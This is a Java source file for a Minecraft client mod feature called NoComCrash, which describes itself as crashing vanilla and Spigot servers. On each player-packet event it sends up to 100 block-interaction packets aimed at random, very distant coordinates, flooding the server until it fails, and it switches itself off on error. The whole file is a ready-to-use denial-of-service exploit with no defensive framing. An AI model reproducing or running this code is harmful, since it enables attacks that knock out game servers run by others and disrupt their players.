package me.dustin.crash.feature;

import me.dustin.crash.CrashPlugin;
import me.dustin.crash.mixin.interf.IWorldClient;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.property.Property;
import me.dustin.jex.helper.misc.ChatHelper;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class NoComCrash extends Feature {

    public Property<Integer> packetCountProperty = new Property.PropertyBuilder<Integer>(this.getClass())
            .name("Packet Count")
            .value(15)
            .min(1)
            .max(100)
            .inc(10)
            .build();
    public final Property<Boolean> autoDisableProperty = new Property.PropertyBuilder<Boolean>(this.getClass())
            .name("Auto Disable")
            .value(true)
            .build();

    private final Random r = new Random();

    public NoComCrash() {
        super(CrashPlugin.CRASH, "Crashes vanilla and Spigot servers");
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        try {
            for (int i = 0; i < packetCountProperty.value(); i++) {
                Vec3d cpos = pickRandomPos();
                int sequence = ((IWorldClient)Wrapper.INSTANCE.getWorld()).getPendingUpdateManager().incrementSequence().getSequence();
                PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false), sequence);
                NetworkHelper.INSTANCE.sendPacket(packet);
            }
        } catch (Exception ignored) {
            ChatHelper.INSTANCE.addClientMessage("Stopping movement crash because an error occurred!");
            setState(false);
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.POST));

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisableProperty.value())
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));

    private Vec3d pickRandomPos() {
        return new Vec3d(r.nextInt(0xFFFFFF), 255, r.nextInt(0xFFFFFF));
    }
}
